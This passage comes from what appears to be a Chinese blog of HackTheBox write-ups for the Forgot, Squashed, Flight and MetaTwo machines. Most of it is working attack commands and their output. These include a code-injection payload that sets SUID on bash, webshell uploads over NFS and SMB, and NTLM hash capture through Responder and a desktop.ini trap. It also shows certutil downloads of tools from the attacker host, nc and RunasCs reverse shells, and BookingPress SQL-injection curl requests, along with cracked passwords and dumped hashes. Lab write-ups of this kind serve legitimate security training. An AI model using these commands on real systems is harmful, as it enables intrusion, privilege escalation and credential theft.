= '/opt/security/lib/KNeighborsClassifier.sav'f5 = '/opt/security/lib/RandomForestClassifier.sav'f6 = '/opt/security/lib/MLPClassifier.sav'# load the models from diskloaded_model1 = pickle.load(open(f1, 'rb'))loaded_model2 = pickle.load(open(f2, 'rb'))loaded_model3 = pickle.load(open(f3, 'rb'))loaded_model4 = pickle.load(open(f4, 'rb'))loaded_model5 = pickle.load(open(f5, 'rb'))loaded_model6 = pickle.load(open(f6, 'rb'))model= Doc2Vec.load(\"/opt/security/lib/d2v.model\")# Create a function to convert an array of strings to a set of featuresdef getVec(text): features = [] for i, line in enumerate(text): test_data = word_tokenize(line.lower()) v1 = model.infer_vector(test_data) featureVec = v1 lineDecode = unquote(line) lowerStr = str(lineDecode).lower() feature1 = int(lowerStr.count('link')) feature1 += int(lowerStr.count('object')) feature1 += int(lowerStr.count('form')) feature1 += int(lowerStr.count('embed')) feature1 += int(lowerStr.count('ilayer')) feature1 += int(lowerStr.count('layer')) feature1 += int(lowerStr.count('style')) feature1 += int(lowerStr.count('applet')) feature1 += int(lowerStr.count('meta')) feature1 += int(lowerStr.count('img')) feature1 += int(lowerStr.count('iframe')) feature1 += int(lowerStr.count('marquee')) # add feature for malicious method count feature2 = int(lowerStr.count('exec')) feature2 += int(lowerStr.count('fromcharcode')) feature2 += int(lowerStr.count('eval')) feature2 += int(lowerStr.count('alert')) feature2 += int(lowerStr.count('getelementsbytagname')) feature2 += int(lowerStr.count('write')) feature2 += int(lowerStr.count('unescape')) feature2 += int(lowerStr.count('escape')) feature2 += int(lowerStr.count('prompt')) feature2 += int(lowerStr.count('onload')) feature2 += int(lowerStr.count('onclick')) feature2 += int(lowerStr.count('onerror')) feature2 += int(lowerStr.count('onpage')) feature2 += int(lowerStr.count('confirm')) # add feature for \".js\" count feature3 = int(lowerStr.count('.js')) # add feature for \"javascript\" count feature4 = int(lowerStr.count('javascript')) # add feature for length of the string feature5 = int(len(lowerStr)) # add feature for \"&lt;script\" count feature6 = int(lowerStr.count('script')) feature6 += int(lowerStr.count('&lt;script')) feature6 += int(lowerStr.count('&amp;lt;script')) feature6 += int(lowerStr.count('%3cscript')) feature6 += int(lowerStr.count('%3c%73%63%72%69%70%74')) # add feature for special character count feature7 = int(lowerStr.count('&amp;')) feature7 += int(lowerStr.count('&lt;')) feature7 += int(lowerStr.count('&gt;')) feature7 += int(lowerStr.count('\"')) feature7 += int(lowerStr.count('\\'')) feature7 += int(lowerStr.count('/')) feature7 += int(lowerStr.count('%')) feature7 += int(lowerStr.count('*')) feature7 += int(lowerStr.count(';')) feature7 += int(lowerStr.count('+')) feature7 += int(lowerStr.count('=')) feature7 += int(lowerStr.count('%3C')) # add feature for http count feature8 = int(lowerStr.count('http')) # append the features featureVec = np.append(featureVec,feature1) featureVec = np.append(featureVec,feature2) featureVec = np.append(featureVec,feature3) featureVec = np.append(featureVec,feature4) featureVec = np.append(featureVec,feature5) featureVec = np.append(featureVec,feature6) featureVec = np.append(featureVec,feature7) featureVec = np.append(featureVec,feature8) features.append(featureVec) return features# Grab linksconn = mysql.connector.connect(host='localhost',database='app',user='diego',password='dCb#1!x0%gjq')cursor = conn.cursor()cursor.execute('select reason from escalate')r = [i[0] for i in cursor.fetchall()]data=[]for i in r: data.append(i)Xnew = getVec(data)#1 DecisionTreeClassifierynew1 = loaded_model1.predict(Xnew)#2 SVCynew2 = loaded_model2.predict(Xnew)#3 GaussianNBynew3 = loaded_model3.predict(Xnew)#4 KNeighborsClassifierynew4 = loaded_model4.predict(Xnew)#5 RandomForestClassifierynew5 = loaded_model5.predict(Xnew)#6 MLPClassifierynew6 = loaded_model6.predict(Xnew)# show the sample inputs and predicted outputsdef assessData(i): score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i])) if score &gt;= .5: try: preprocess_input_exprs_arg_string(data[i],safe=False) except: passfor i in range(len(Xnew)): t = threading.Thread(target=assessData, args=(i,))# t.daemon = True t.start() 提权 &amp; root flag使用前面得到的数据库账号密码在数据库中插入恶意数据，然后运行对应脚本触发命令执行： 1234mysql -D app -udiego -p# dCb#1!x0%gjqinsert into escalate values (\"1\",\"1\",\"1\",'test=exec(\"\"\"\\nimport os\\nos.system(\"chmod +s /usr/bin/bash\")\"\"\")'); shadow12root:$6$KPqhZTXCQFI1KCL7$IK7wbX2aLhUUXi4HFfJLUNhXaGRjkvDVE0Pjv0bazG&#x2F;KwmHjoyrDtO3ZEPReTQ.VvCRrq.71XKuOLCHsrGebL.:19189:0:99999:7:::diego:$6$qqWep8woW8VNQ3oI$Ijm5f8n9C09jPdg5pAttI7l2CGsP7doqd&#x2F;gw5E9.H8QVfdoDbtPsEwYl2qGIEcNil.nyagcPyKjDRFidpSrpC.:19171:0:99999:7::: 参考资料 Code injection in saved_model_cli in TensorFlow · CVE-2022-29216 · GitHub Advisory Databasehttps://github.com/advisories/GHSA-75c9-jrh4-79mc Forgot - HTB [Discussion] | BreachForumshttps://breached.to/Thread-Forgot-HTB-Discussion HTB - Forgot [Medium] // meowmeowattackhttps://meowmeowattack.github.io/htb/forgot/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Squashed - HackTheBox","slug":"Squashed-HackTheBox","date":"2022-11-10T02:52:10.000Z","updated":"2022-12-23T02:53:39.764Z","comments":true,"path":"2022/11/10/Squashed-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/11/10/Squashed-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/514 10.10.11.191 端口扫描22,80,111,2049： 123456789101112131415161718192021222324252627282930313233343536373839404142$ nmap -sC -sV -Pn 10.10.11.191Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-23 10:02 CSTNmap scan report for 10.10.11.191Host is up (0.19s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)| 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)|_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Built Better|_http-server-header: Apache/2.4.41 (Ubuntu)111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo:| program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100000 3,4 111/tcp6 rpcbind| 100000 3,4 111/udp6 rpcbind| 100003 3 2049/udp nfs| 100003 3 2049/udp6 nfs| 100003 3,4 2049/tcp nfs| 100003 3,4 2049/tcp6 nfs| 100005 1,2,3 42739/tcp6 mountd| 100005 1,2,3 45443/tcp mountd| 100005 1,2,3 58177/udp6 mountd| 100005 1,2,3 60862/udp mountd| 100021 1,3,4 36049/udp nlockmgr| 100021 1,3,4 36287/tcp6 nlockmgr| 100021 1,3,4 37279/tcp nlockmgr| 100021 1,3,4 44346/udp6 nlockmgr| 100227 3 2049/tcp nfs_acl| 100227 3 2049/tcp6 nfs_acl| 100227 3 2049/udp nfs_acl|_ 100227 3 2049/udp6 nfs_acl2049/tcp open nfs_acl 3 (RPC #100227)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 59.04 seconds 80家具相关的： 2049 nfsnfs可以访问到两个目录： 12345678910$ showmount -e 10.10.11.191Exports list on 10.10.11.191:/home/ross */var/www/html *mkdir rossmkdir html# mac上的mount命令sudo mount -o resvport,rw,nolocks -t nfs 10.10.11.191:/home/ross rosssudo mount -o resvport,rw,nolocks -t nfs 10.10.11.191:/var/www/html html webshellhtml就是web住目录，通过nfs写webshell,因为对应目录的uid是2017，我们需要新建一个对应id的用户： 12345678$ ls -ld htmldrwxr-xr-- 5 2017 _appstore 4096 12 23 10:10 htmlsudo useradd dummysudo usermod -u 2017 dummy sudo su dummy -c bashecho xxx &gt; shell.php user flagwebshell是alex权限，常规shell，user flag: 提权信息ross用户目录发现有.Xauthority文件，我们可以通过NFS下载下来后放到alex用户目录,然后查看信息可以发现keepass密码： 12345wXAUTHORITY&#x3D;&#x2F;tmp&#x2F;.Xauthority xdpyinfo -display :0XAUTHORITY&#x3D;&#x2F;tmp&#x2F;.Xauthority xwininfo -root -tree -display :0Keepassxc 截屏可以得到解密的keepass界面，得到root密码： 123456XAUTHORITY=/tmp/.Xauthority xwd -root -screen -silent -display :0 &gt; /tmp/miao.xwdsudo apt install imagemagickconvert screenshot.xwd screenshot.pngcah$mei7rai9A root flagroot ssh登录： 参考资料 HTB: Squashed | 0xdf hacks stuffhttps://0xdf.gitlab.io/2022/11/21/htb-squashed.html","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Flight - HackTheBox","slug":"Flight-HackTheBox","date":"2022-11-07T08:20:19.000Z","updated":"2023-05-08T01:32:26.347Z","comments":true,"path":"2022/11/07/Flight-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/11/07/Flight-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/510 10.10.11.187 端口扫描80，以及windows域常规端口： 1234567891011121314151617181920212223242526272829303132333435$ nmap -sC -sV -Pn 10.10.11.187Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 13:39 CSTNmap scan report for 10.10.11.187Host is up (0.21s latency).Not shown: 988 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1|_http-title: g0 Aviation| http-methods:|_ Potentially risky methods: TRACE88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-11-07 12:42:13Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)3269/tcp open tcpwrappedService Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:| date: 2022-11-07T12:42:28|_ start_date: N/A| smb2-security-mode:| 311:|_ Message signing enabled and required|_clock-skew: 7h00m00sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 219.19 seconds 80某航空公司网站： 子域名扫描80页面底部可以得到主域名，继续探测子域名，发现school： 1234510.10.11.187 flight.htbffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u \"http://flight.htb/\" -H 'Host: FUZZ.flight.htb' -fs 7069school [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 214ms] schoolschool加hosts后访问，发现view参数，猜测LFI： LFI直接读index，发现代码中有各种过滤： 1view-source:http:&#x2F;&#x2F;school.flight.htb&#x2F;index.php?view&#x3D;index.php responder但注意这是windows靶机，这些过滤并没有过滤掉UNC路径，所以开启Responder，得到svc_apache hash,破解出来密码： 1234567891011sudo python3 Responder.py -i 10.10.14.5 -wPhttp://school.flight.htb/index.php?view=//10.10.14.5/miao[SMB] NTLMv2-SSP Client : 10.10.11.187[SMB] NTLMv2-SSP Username : flight\\svc_apache[SMB] NTLMv2-SSP Hash : svc_apache::flight:d97722b76908e7cdsudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtS@Ss!K@*t13 (svc_apache) SMB使用得到的账号密码枚举smb： users使用得到的密码枚举用户, 之后进行密码喷洒，发现s.moon使用相同密码： 12345crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' --users./cme smb 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue-on-successSMB 10.10.11.187 445 G0 [+] flight.htb\\S.Moon:S@Ss!K@*t13 users.txt123456789101112131415svc_apacheO.PossumV.StevensD.TruffI.FrancisW.WalkerC.BumM.GoldL.KeinG.LorsR.ColdS.MoonkrbtgtGuestAdministrator Shared尝试使用S.Moon pexec失败，但可以发现对shared目录有写权限： 这个目录可能会有其他用户定期访问，所以尝试其他方式获取hash： Places to steal NTLM creds - HackTrickshttps://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini 12345678910└─$ smbclient //10.10.11.187/shared -U s.moonPassword for [WORKGROUP\\s.moon]:Try \"help\" to get a list of possible commands.smb: \\&gt; put desktop.iniputting file desktop.ini as \\desktop.ini (0.1 kb/s) (average 0.1 kb/s)smb: \\&gt;[SMB] NTLMv2-SSP Client : 10.10.11.187[SMB] NTLMv2-SSP Username : flight.htb\\c.bum[SMB] NTLMv2-SSP Hash : c.bum::flight.htb:a80233880ad07bcc等一会儿，得到c.bum用户hash： 同样破解出来密码： 123sudo john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txtTikkycoll_431012284 (c.bum) desktop.ini12[.ShellClassInfo]IconResource&#x3D;\\\\10.10.14.5\\miao Webc.bum用户可以写web目录，写webshell去访问触发，得到svc_apache shell: 123456789101112131415└─$ smbclient //10.10.11.187/web -U c.bumPassword for [WORKGROUP\\c.bum]:Try \"help\" to get a list of possible commands.smb: \\&gt; ls . D 0 Mon Nov 7 21:38:38 2022 .. D 0 Mon Nov 7 21:38:38 2022 flight.htb D 0 Mon Nov 7 21:37:00 2022 school.flight.htb D 0 Mon Nov 7 21:37:00 2022 shell.php A 42 Mon Nov 7 21:38:38 2022 5056511 blocks of size 4096. 1028784 blocks availablesmb: \\&gt; cd school.flight.htbsmb: \\school.flight.htb\\&gt; put shell.phpputting file shell.php as \\school.flight.htb\\shell.php (0.1 kb/s) (average 0.0 kb/s)smb: \\school.flight.htb\\&gt; c.bum shell &amp; user flag因为已经有c.bum用户密码，所以可以直接runas执行任意命令，这个增强版的可以直接得到shell： antonioCoco/RunasCs: RunasCs - Csharp and open version of windows builtin runas.exehttps://github.com/antonioCoco/RunasCs 通过smb那边传文件，svc_apache shell中执行，得到c.bum shell： 1.\\Runascs.exe c.bum Tikkycoll_431012284 powershell -r 10.10.14.5:5555 提权信息枚举发现本地8000端口服务，是system service： 12345678910Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:8000 0.0.0.0:0 LISTENING 4 tasklist /fi \"pid eq 4\"Image Name PID Session Name Session# Mem Usage========================= ======== ================ =========== ============System 4 Services 0 156 K 转发出来查看： 123456# local./chisel_1.7.0-rc7_darwin_amd64 server -p 9999 --reverse# targetcertutil.exe -urlcache -f http://10.10.14.5:7777/chisel.exe chisel.exe.\\chisel.exe client --max-retry-count=1 10.10.14.5:9999 R:8000:127.0.0.1:8000 是一个aspx网站，直接在对应目录c:\\inetpub\\development\\放webshell然后通过web去触发，得到iis 服务权限： 1certutil.exe -urlcache -f http:&#x2F;&#x2F;10.10.14.5:7777&#x2F;cmdasp.aspx cmdasp.aspx 后面就是service to system，有SeImpersonatePrivilege 提权 &amp; root flag antonioCoco/JuicyPotatoNG: Another Windows Local Privilege Escalation from Service Account to Systemhttps://github.com/antonioCoco/JuicyPotatoNG 123456789certutil.exe -urlcache -f http://10.10.14.5:7778/nc.exe nc.execertutil.exe -urlcache -f http://10.10.14.5:7778/JuicyPotatoNG.exe JuicyPotatoNG.exe# allow both binaries to be run by everyoneicacls .\\nc.exe /grant Everyone:Ficacls .\\JuicyPotatoNG.exe /grant Everyone:F# IIS APPPOOL\\DefaultAppPool shell中执行c:\\temp\\JuicyPotatoNG.exe -t * -p \"C:\\temp\\nc.exe\" -a \"10.10.14.5 6666 -e cmd.exe\" 后面就是加载meterpreter，读flag，hashdump： 1certutil.exe -urlcache -f http:&#x2F;&#x2F;10.10.14.5:7777&#x2F;met.exe met.exe hashdump123456789101112131415161718meterpreter &gt; hashdumpAdministrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6a2b6ce4d7121e112aeacbc6bd499a7f:::S.Moon:1602:aad3b435b51404eeaad3b435b51404ee:f36b6972be65bc4eaa6983b5e9f1728f:::R.Cold:1603:aad3b435b51404eeaad3b435b51404ee:5607f6eafc91b3506c622f70e7a77ce0:::G.Lors:1604:aad3b435b51404eeaad3b435b51404ee:affa4975fc1019229a90067f1ff4af8d:::L.Kein:1605:aad3b435b51404eeaad3b435b51404ee:4345fc90cb60ef29363a5f38e24413d5:::M.Gold:1606:aad3b435b51404eeaad3b435b51404ee:78566aef5cd5d63acafdf7fed7a931ff:::C.Bum:1607:aad3b435b51404eeaad3b435b51404ee:bc0359f62da42f8023fdde0949f4a359:::W.Walker:1608:aad3b435b51404eeaad3b435b51404ee:ec52dceaec5a847af98c1f9de3e9b716:::I.Francis:1609:aad3b435b51404eeaad3b435b51404ee:4344da689ee61b6fbbcdfa9303d324bc:::D.Truff:1610:aad3b435b51404eeaad3b435b51404ee:b89f7c98ece6ca250a59a9f4c1533d44:::V.Stevens:1611:aad3b435b51404eeaad3b435b51404ee:2a4836e3331ed290bd1c2fd2b50beb41:::svc_apache:1612:aad3b435b51404eeaad3b435b51404ee:f36b6972be65bc4eaa6983b5e9f1728f:::O.Possum:1613:aad3b435b51404eeaad3b435b51404ee:68ec50916875888f44caff424cd3f8ac:::G0$:1001:aad3b435b51404eeaad3b435b51404ee:140547f31f4dbb4599dc90ea84c27e6b:::meterpreter &gt; 参考资料 Places to steal NTLM creds - HackTrickshttps://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini antonioCoco/RunasCs: RunasCs - Csharp and open version of windows builtin runas.exehttps://github.com/antonioCoco/RunasCs antonioCoco/JuicyPotatoNG: Another Windows Local Privilege Escalation from Service Account to Systemhttps://github.com/antonioCoco/JuicyPotatoNG HTB - Flight [Hard] // meowmeowattackhttps://meowmeowattack.github.io/htb/flight/ Flight - HTB [Discussion] | BreachForumshttps://breached.to/Thread-Flight-HTB-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"MetaTwo - HackTheBox","slug":"MetaTwo-HackTheBox","date":"2022-11-01T06:27:55.000Z","updated":"2023-05-04T01:07:24.357Z","comments":true,"path":"2022/11/01/MetaTwo-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/11/01/MetaTwo-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/504 10.10.11.186 端口扫描21,22,80: 1234567891011121314151617181920212223242526272829303132333435$ nmap -sC -sV -Pn 10.10.11.186Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 13:03 CSTNmap scan report for 10.10.11.186Host is up (0.19s latency).Not shown: 992 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp?| fingerprint-strings:| GenericLines:| 220 ProFTPD Server (Debian) [::ffff:10.10.11.186]| Invalid command: try being more creative|_ Invalid command: try being more creative22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:| 3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)| 256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)|_ 256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)80/tcp open http nginx 1.18.0|_http-title: Did not follow redirect to http://metapress.htb/|_http-server-header: nginx/1.18.01524/tcp filtered ingreslock2106/tcp filtered ekshell2179/tcp filtered vmrdp8192/tcp filtered sophos60443/tcp filtered unknown1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port21-TCP:V=7.93%I=7%D=11/1%Time=6360A8F9%P=x86_64-apple-darwin21.5.0%SF:r(GenericLines,8F,\"220\\x20ProFTPD\\x20Server\\x20\\(Debian\\)\\x20\\[::ffff:1SF:0\\.10\\.11\\.186\\]\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\SF:x20creative\\r\\n500\\x20Invalid\\x20command:\\x20try\\x20being\\x20more\\x20crSF:eative\\r\\n\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 262.94 seconds 80需要加hosts 110.10.11.186 metapress.htb 一个wordpress： 查看events，源码中可以知道使用了booking press 1.0.10插件： CVE-2022-0739插件sql注入： BookingPress &lt; 1.0.11 - Unauthenticated SQL Injection WordPress Security Vulnerabilityhttps://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357 要利用这个漏洞，首先需要再events页面源码中获取wpnonce: 1var postData &#x3D; &#123; action:&#39;bookingpress_generate_spam_captcha&#39;, _wpnonce:&#39;a3e32ad14e&#39; &#125;; 然后就是一步步sql注入获取数据，可以手动，也可以sqlmap： 123456curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&amp;_wpnonce=a3e32ad14e&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&amp;_wpnonce=a3e32ad14e&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT group_concat(user_login),group_concat(user_pass),@@version_compile_os,1,2,3,4,5,6 from wp_users-- -'admin admin@metapress.htb $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.manager manager@metapress.htb $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 hash crack可以破解出来manager的密码： 123sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtpartylikearockstar wordpress得到的账号密码登录wordpress，知道版本是5.6.2，可以搜到相关漏洞： WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8 WordPress Security Vulnerabilityhttps://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5 motikan2010/CVE-2021-29447: WordPress - Authenticated XXE (CVE-2021-29447)https://github.com/motikan2010/CVE-2021-29447 XXE利用这个漏洞读文件，从nginx配置文件中得到wordpress路径，然后去读config，在config中得到FTP账号密码： 123456789101112131415161718192021222324/etc/nginx/sites-enabled/default/var/www/metapress.htb/blog/wp-config.phpdefine( 'DB_NAME', 'blog' );/** MySQL database username */define( 'DB_USER', 'blog' );/** MySQL database password */define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );define( 'FS_METHOD', 'ftpext' );define( 'FTP_USER', 'metapress.htb' );define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );define( 'FTP_HOST', 'ftp.metapress.htb' );define( 'FTP_BASE', 'blog/' );define( 'FTP_SSL', false );define( 'AUTH_KEY', '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7&#125;`rXVG=3 n&gt;+3m?.B/:' );define( 'SECURE_AUTH_KEY', 'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf&#123;=]a%' );define( 'LOGGED_IN_KEY', 'J+mxCaP4z&lt;g.6P^t`ziv&gt;dd&#125;EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C&#123;qKXy' );define( 'NONCE_KEY', 'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q&#123;^z(F?)7mxNUg986tQO7O5' );define( 'AUTH_SALT', '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s&#125;d&lt;&amp;M;.,x0z~R&gt;3!D' );define( 'SECURE_AUTH_SALT', '&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.' );define( 'LOGGED_IN_SALT', '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw&#125;Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=' );define( 'NONCE_SALT', '.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#&#125;w!Bq,h&#125;V9jKSkTGsv%Y451F8L=bL' ); FTP得到的账号密码登录FTP，在send_email.php中得到jnelson密码： 123456$mail-&gt;Host &#x3D; &quot;mail.metapress.htb&quot;;$mail-&gt;SMTPAuth &#x3D; true;$mail-&gt;Username &#x3D; &quot;jnelson@metapress.htb&quot;;$mail-&gt;Password &#x3D; &quot;Cb4_JmWM8zUZWMu@Ys&quot;;$mail-&gt;SMTPSecure &#x3D; &quot;tls&quot;;$mail-&gt;Port &#x3D; 587; user flagjnelson ssh登录： 提权信息当前用户目录下有个.passpie目录，搜索资料可以知道这是个密码管理器 marcwebbie/passpie: Multiplatform command-line password managerhttps://github.com/marcwebbie/passpie 查看其中文件可以发现加密的pgp key和root pass： 提权 &amp; root flag首先破解出来pgp key的密码,然后导出密码，得到root ssh密码 12345678910111213141516171819202122gpg2john pgp_key &gt; hash.txtsudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtblink182passpie export passcredentials:- comment: '' fullname: root@ssh login: root modified: 2022-06-26 08:58:15.621572 name: ssh password: !!python/unicode 'p7qfAZt4_A1xo_0x'- comment: '' fullname: jnelson@ssh login: jnelson modified: 2022-06-26 08:58:15.514422 name: ssh password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'handler: passpieversion: 1.0 shadow12root:$y$j9T$dnzdMw6.gAkYBbVw1pRaz.$2laiSFO34jFWk9&#x2F;r6kkJo2tArgYO8AGv2v0FkUPwlr2:19270:0:99999:7:::jnelson:$y$j9T$EJLWL6&#x2F;.ymr3lhpWK6Qda.$lDuRPBwlcUKkAoAenAKRYNG2QFkPCk2lkkIdXQIRK.A:19169:0:99999:7::: 参考资料 BookingPress &lt; 1.0.11 - Unauthenticated SQL Injection WordPress Security Vulnerabilityhttps://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357 WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8 WordPress Security Vulnerabilityhttps://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5 motikan2010/CVE-2021-29447: WordPress - Authenticated XXE (CVE-2021-29447)https://github.com/motikan2010/CVE-2021-29447 marcwebbie/passpie: Multiplatform command-line password managerhttps://github.com/marcwebbie/passpie MetaTwo - HTB [Discussion] | BreachForumshttps://breached.to/Thread-MetaTwo-HTB-Discussion Hackthebox Metatwo Writeup | 0xDedinfosec Bloghttps://0xdedinfosec.vercel.app/post/hackthebox-metatwo-writeup HackTheBox (HTB) Writeup: MetaTwo [Easy] – meowmeowattackhttps://meowmeowattack.xyz/2022/10/31/hackthebox-htb-writeup-metatwo/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Awkward - HackTheBox","slug":"Awkward-HackTheBox","date":"2022-10-30T08:23:34.000Z","updated":"2023-02-27T01:06:04.606Z","comments":true,"path":"2022/10/30/Awkward-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/10/30/Awkward-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/503 10.10.11.185 端口扫描22和80: 12345678910111213141516171819$ nmap -sC -sV -Pn 10.10.11.185Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-25 13:15 CSTStats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing Service ScanService scan Timing: About 50.00% done; ETC: 13:16 (0:00:06 remaining)Nmap scan report for 10.10.11.185Host is up (0.20s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 7254afbaf6e2835941b7cd611c2f418b (ECDSA)|_ 256 59365bba3c7821e326b37d23605aec38 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Site doesn't have a title (text/html).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 68.53 seconds 80需要加hosts: 110.10.11.185 hat-valley.htb app.js/js/app.js中可以得到一些路由(也可以在后面的ssrf中得到)： 12345678var baseURL = \"/api/\"/all-leave/submit-leave/login/staff-detailsvar routes = [&#123; path: \"/\", name: \"base\", component: _Base_vue__WEBPACK_IMPORTED_MODULE_3__[\"default\"]&#125;, &#123; path: \"/hr\", name: \"hr\", component: _HR_vue__WEBPACK_IMPORTED_MODULE_4__[\"default\"]&#125;, &#123; path: \"/dashboard\", name: \"dashboard\", component: _Dashboard_vue__WEBPACK_IMPORTED_MODULE_5__[\"default\"], meta: &#123; requiresAuth: true &#125;&#125;, &#123; path: \"/leave\", name: \"leave\", component: _Leave_vue__WEBPACK_IMPORTED_MODULE_6__[\"default\"], meta: &#123; requiresAuth: true &#125;&#125;]; 子域名扫描子域名可以发现一个store： 123ffuf -w 